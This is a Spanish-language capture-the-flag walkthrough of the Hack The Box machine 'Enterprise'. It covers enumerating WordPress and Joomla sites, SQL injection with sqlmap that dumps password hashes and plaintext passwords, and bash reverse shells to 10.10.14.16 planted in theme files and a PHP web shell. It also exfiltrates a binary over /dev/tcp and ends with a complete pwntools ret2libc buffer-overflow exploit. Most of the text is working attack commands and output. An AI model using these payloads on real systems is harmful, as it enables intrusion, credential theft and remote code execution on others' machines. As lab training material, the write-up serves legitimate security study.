# 10.10.10.61 - Enterprise
---------------------------

# Part 1: Las Webs:

Puertos abiertos 22(ssh), 80(http), 443(https), 8080(http) Nmap nos dice que:  
- Puerto 80: Wordpress 4.8.1, Apache/2.4.10   
- Puerto 443: nombre enterprise.local  
- 8080: Apache httpd 2.4.10, prtencial proxy abierto? Joomla. Tiene un robots.txt  

La máquina parece que está ambientada en Star Trek.

---------------------------
## Web del puerto 8080: Joomla

![enterprise1](https://user-images.githubusercontent.com/96772264/204105478-d01f3f78-dd94-40a1-bed6-91ddc1c9ebe3.PNG)

En efecto hay un robots.txt en el puerto 8080:
```console
└─$ curl http://10.10.10.61:8080/robots.txt
administrator,bin,cache,cli,components,includes,installation,joomla,language,layouts,libraries,logs,modules,plugins,tmp

└─$ for ruta in administrator bin cache cli components includes installation joomla language layouts libraries logs modules plugins tmp; do echo "$ruta > "; curl -s http://10.10.10.61:8080/$ruta/ | html2text ; done
# Solo funciona administrator que nos da un panel de login. Pero en una de ellas nos chivan la ruta index.php
```
El index.php apenas nos da textos relacionados con Star Trek. Pero en el codigo fuente hay cosas extrañas:
```
<a href="/index.php/component/users/?view=remind&amp;Itemid=101">
Forgot your username?</a>

<a href="/index.php/component/users/?view=reset&amp;Itemid=101">
Forgot your password?</a>

<input type="hidden" name="option" value="com_users" />
<input type="hidden" name="task" value="user.login" />
<input type="hidden" name="return" value="aHR0cDovLzEwLjEwLjEwLjYxOjgwODAvaW5kZXgucGhw" />
<input type="hidden" name="876f8845ca4cac6c359d0bab4dbd1e2d" value="1" />	</div>
```
```console
└─$ echo "aHR0cDovLzEwLjEwLjEwLjYxOjgwODAvaW5kZXgucGhw" | base64 -d
http://10.10.10.61:8080/index.php
```
----------------------
## Web del puerto 80: Wordpress

Al entrar nos carga una web pero con el css mal (o sea todo bugueado). Hay mas textos de star trek que intentan resolver a entreprise.htb (al /etc/hosts igual que 
el enterprise.local)  

![enterprise2](https://user-images.githubusercontent.com/96772264/204105503-a188d9ef-b602-43f6-bb8b-b0b776c8ab1c.PNG)

En la web aparecen entradas de texto con la url del estilo ```http://enterprise.htb/?p=57``` Cuando tenenmos un numero en una url se ocurren cosas como
cambiarlo o probar inyecciones SQL. 

![enterprise3](https://user-images.githubusercontent.com/96772264/204105519-010a4721-49d8-41a8-b554-a32ad2917b33.PNG)

```console
└─$ for i in $(seq 1 100); do echo -n "$i >"; curl -s "http://enterprise.htb/?p=$i" -I | head -n1 | grep -v "404"; done
# 14,15,16,24 y 71 -> 301 Moved Permanently
# 51, 53, 55, 57 y 69 -> 200 OK, las que nos salian en la web

└─$ curl -s http://enterprise.htb/?p=14 -I | grep -i "location"  
Location: http://enterprise.htb/?attachment_id=14

└─$ for i in $(seq 1 100); do echo -n "$i >"; curl -s "http://enterprise.htb/?attachment_id=$i" -I | head -n1 | grep -v "404"; done
# 1, 53, 55, 57 y 69 y 71 -> Moved Permanently, las que antes nos daban 200 ok
# 13, 14,15, 16, 23, 24 # -> 200 OK
```
Las rutas que nos daban OK son fotos de enterprise.htb/wp-content/uploads/ Las que nos da redireccion nos mandan a page_id=71.... Otraaa veeez a hacer lo miiiismo.  
```console
└─$ for i in $(seq 1 100); do echo -n "$i >"; curl -s "http://enterprise.htb/?page_id=$i" -I | head -n1 | grep -v "404"; done
# 1, 14, 15, 16, 123, 24, 53, 55, 57, 59, 66 y 69 -> 301 Moved Permanently a attachement=id (la de antes)
```
Parece que no vamos a sacar mucho mas, pero al menos tenemos la ruta /wp-content/ y /uploads(muy comunes en wordpress)  
- Wp-content no tiene directory listing, es decir no podemos ver los archivos que contiene, **/plugins** tambien **/uploads** sa 403 forbidden.  

----------------------
## Web del puerto 443: Apache
Es la clasica web por defecto de Apache:
```console
└─$ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://enterprise.local/FUZZ/
000000070:   403        11 L     32 W       298 Ch      "icons"
000000081:   200        16 L     59 W       946 Ch      "files"
```
En **/files** hay un "lcars.zip". Lo descargamos y descomprimimos **unzip**. 
- lcars.php -> dice que es un plugin para enterprise.htb 
- lcars_db.php -> tira de wp-config.php (las creds) y hace una consulta sql:
- lcars_dbpost.php -> otra consulta sql igual que la anterior.

> lcars_db.php -> /GET "query" -> "SELECT ID FROM wp_posts WHERE post_name = $query"   
> lcars_dbpost.php -> "SELECT post_title FROM wp_posts WHERE ID = $query"   

Como lcars_dbpost.php tiene la linea ```$query = (int)$_GET['query'];``` no le valdran inyecciones. En cambio a la otra no hace eso.

----------------------

# Part 2: SQLi

Si ponemos ```http://enterprise.htb/wp-content/plugins/lcars/?query=1``` nos da 403 forbidden:  
```http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=1``` -> "Hello world"   
```/wp-content/plugins/lcars/lcars_db.php?query=1``` ->  Error el parametro no se puede convertir en string   
```
1' and sleep(5)-- -  # nada, pero  1 and sleep(5)-- -  si va
1' or sleep(5)-- -   # nada
```
El script de blind sqli que se hizo en la máquina europa no funciona con esta. Tendrá una sqli muy rebuscada asi  que habrá que tirar de la trampa del sqlmap  
```console
#### BASES DE DATOS ####
└─$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch --dbs
# information_schema joomla joomladb mysql performance_schema sys wordpress wordpressdb

#### WORDPRESS ####
└─$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress --tables
# wp_commentmeta wp_comments wp_links wp_options wp_postmeta wp_posts wp_term_relationships wp_term_taxonomy wp_termmeta wp_terms wp_usermeta wp_users

└─$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress -T wp_users --dump
# william.riker@enterprise.htb -> william.riker -> $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2

└─$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress -T wp_posts --columns
# post_name, post_author, post_content

└─$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress -T wp_posts -C post_name,post_author,post_content --dump

#### JOOMLADB ####
└─$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D joomladb --tables
# edz2g_users

└─$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D joomladb -T edz2g_users --columns

└─$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D joomladb -T edz2g_users -C username,password --dump
#Guinan          | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q
#geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy

# Lo exporta todo en
└─$ cat /home/cucuxii/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv | sed 's/\\n/\n/g' | sed 's/\\r/\r/g' | grep "\S" --color=none
ZxJyhGem4k338S2Y
enterprisencc170
ZD3YxfnSjezg67JZ
u*Z14ru0p#ttj83zS6
```
Tendriamos 3 usaurios y 4 posibles contraseñas  

--------------------------
# Part 3: Accediendo al sistema.

Entramos a wordpress por /wp-admin con el william.riker:u*Z14ru0p#ttj83zS6  

La manera de conseguir una reverse shell por wordpress es editar un tema en Appearence/Editor como 404.php  
```system("bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'");```
![enterprise4](https://user-images.githubusercontent.com/96772264/204105570-ea55f56e-15b1-4ad7-a497-9238995daf30.PNG)

Haces una peticion a http://enterprise.htb/?p=690 (no existe asi que salta 404)  
```console
www-data@b8319d86d21e:/var/www/html$ hostname -I
172.17.0.3
www-data@b8319d86d21e:/var/www/html$ for i in {1..254}; do (ping -c 1 172.17.0.${i} | grep "bytes from" | grep -v "Unrchable" &); done;
64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.112 ms
64 bytes from 172.17.0.1: icmp_seq=0 ttl=64 time=0.126 ms
64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.038 ms # wordpress
64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.155 ms
```
Como el sistema no tiene nano hago en el mio un script para reconocer puertos  
```bash
#!/bin/bash
for host in 172.17.0.1 172.17.0.2 172.17.0.3 172.17.0.4; do
    echo -n "$host: "
    for port in $(seq 1 1000); do
        timeout 1 bash -c "echo '' >/dev/tcp/$host/$port" 2>/dev/null && echo -n "$port " &
    done; wait; echo
done
```
```console
└─$ cat ports.sh | base64 -w0
IyEvYmluL2Jhc2gKCmZvciBob3...

wwwww-data@b8319d86d21e:/tmp$ echo "IyEvYmluL2Jhc2gKCmZvciB..." | base64 -d | bash
172.17.0.1: 22 80 443 
172.17.0.2: 
172.17.0.3: 80 
172.17.0.4: 80 
```
Cada host salvo el 0.2 almacena una web, siendo la nuestra (wordpress) la 172.17.0.3  

Para el joomla he entrado con:  geordi.la.forge:ZD3YxfnSjezg67JZ **/adminsitrator**
En **/extensions/templates** seleccionar la protostar y luego editar error.php
```system("bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'");```
![enterprise5](https://user-images.githubusercontent.com/96772264/204105584-f5d1cb4d-c20c-46b2-a406-b5f3a9733473.PNG)
```console
www-data@a7018bfdc454:/var/www/html$ hostname -I
172.17.0.4 
```
Por tanto ya tenemos dos hosts comprometidos. Cuando tenemos un docker lo que hay que hacer es mirar monturas es decir carpetas heredadas de la maquina original,
suelen tener como usuario a root. Miramos en /var/www/html porque es la serie de archivos que el servidor ofrece a la red.  
```console
www-data@a7018bfdc454:/var/www/html$ find . -user root 2>/dev/null
./files
./files/lcars.zip

www-data@a7018bfdc454:/var/www/html$ mount -l | grep "files"       
/dev/mapper/enterprise--vg-root on /var/www/html/files type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```
Es decir /files son los archivos de /dev/mapper/enterprise. En la web accedemos por el Apache (puerto 443 o sea 172.17.0.1)
```php
<?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.16/666 0>&1'");
?>
```
```console
wwwww-data@a7018bfdc454:/var/www/html$ echo "PD9waHAKCXN5c3RlbSgiYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjYgMD4mMSciKTsKPz4K" | base64 -d > ./files/cucuxii.php
```
Con eso ya saltaríamos a la máquina en sí
Enumeramos el sistema:
- Usarios: root y jeanpaulpicard  
- SUIDS: /bin/lcars  
- Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian  
- Algo esta corriendo por el puerto 32812 y el 5355  

```
└─$ nmap -sCV -T5 -p5355,32812 -vvv 10.10.10.61 
5355/tcp  filtered llmnr   no-response
32812/tcp open     unknown syn-ack

Welcome to the Library Computer Access and Retrieval System
Enter Bridge Access Code:
Invalid Code
Terminating Console
```
Parece un programa propio

```console
www-data@enterprise:/tmp$ cat < /bin/lcars > /dev/tcp/10.10.14.16/6666
└─$ sudo nc -nlvp 6666 > lcars
```
```
└─$ file lcars
lcars: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=88410652745b0a94421ce22ea4278a8eaea8db57, not stripped

└─$ ./lcars
                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System
Enter Bridge Access Code: test
Invalid Code. Terminating Console
```
Vamos a analizar el binario (que es el mismo que se comaprte por uno de esos puertos extraños):  

```console
└─$ ltrace ./lcars
puts("Enter Bridge Access Code: "Enter Bridge Access Code: 
fgets("test\n", 9, 0xf7ed7620)  # fgets(respuesta, tamaño (9 o sea la nuestra no que son 5), donde lo guarda)
strcmp("test\n", "picarda1\n")  # Es decir el codigo tiene que ser "picarda1"
Invalid Code. Terminating Console
exit(0)

└─$ ./lcars
Enter Bridge Access Code: picarda1
LCARS Bridge Secondary Controls -- Main Menu: 

1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input:
# Todas estas opciones piden strings.

└─$ python3 -c "print('A'* 300)";
# Pruebo a meter esto en todos lados, en la funcion 4 (security) da "segmentation fault" o sea hay un buffer 
# overflow

Enter Bridge Access Code: picarda1
LCARS Bridge Secondary Controls -- Main Menu:
Waiting for input: 4

Disable Security Force Fields
Enter Security Override: AAAAAAAAAAAAAAAAAAAAAAAAAA.... # -> seg fault

└─$ gdb ./lcars
gef➤  pattern create 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaka... # Creamos un patrón reconocible

gef➤ r 
...
Enter Security Override: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaka...

$esp   : 0xffffd0c0  →  "eaacfaacgaachaaciaacjaac..."   # Inicio de la pila
$eip   : 0x63616164 ("daac"?) # final de la pila, a la direccion a la que tiene que saltar
gef➤  pattern offset $eip
[+] Found at offset 212 (little-endian search) likely

gef➤  x $eip
0x63616164:	Cannot access memory at address 0x63616164   # esta memoria no existe por eso corrompe el programa
gef➤  x/16wx $esp # Esto al estar despues del eip es la pila de la siguiente funcion (0xffffd0bc)
0xffffd0c0:		0x63616166	0x63616167	0x63616168

# Si le pasamos al programa el resultado de esto: python3 -c "print('A'* 212 + 'B'*4)" el eip será BBBB
```

Vamos a hacer un ret2libc que aprovecha las funciones del propio binario para entablarnos una consola: system("sh")  
Las direcciones las tenemos que sacar de la máquina victima.  
```console
www-data@enterprise:/var/www/html/files$ /usr/bin/gdb /bin/lcars
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e4c060 <system>
(gdb) p &exit
$2 = (<text variable, no debug info> *) 0xf7e3faf0 <exit>

(gdb) disass main
(gdb) b *0x56555c9e  # de las primeras lineas de main
(gdb) r
(gdb) find &system,+9999999,"sh"
0xf7f6ddd5
```
Quedando el exploit tal que así (como en la máquina victima hay python3 y no python hay mucho problema con los bits, asi que hay que hacerlo remoto)
```python
from pwn import *
from struct import pack

payload = b"A"*212
payload += pack('<I',0xf7e4c060)
payload += pack('<I',0xf7e3faf0)
payload += pack('<I',0xf7f6ddd5)

lcars = remote("10.10.10.61", 32812)
lcars.recvuntil("Enter Bridge Access Code:"); lcars.sendline("picarda1")
lcars.recvuntil("Waiting for input:"); lcars.sendline("4")
lcars.recvuntil("Enter Security Override:"); lcars.sendline(payload)
lcars.interactive()
```


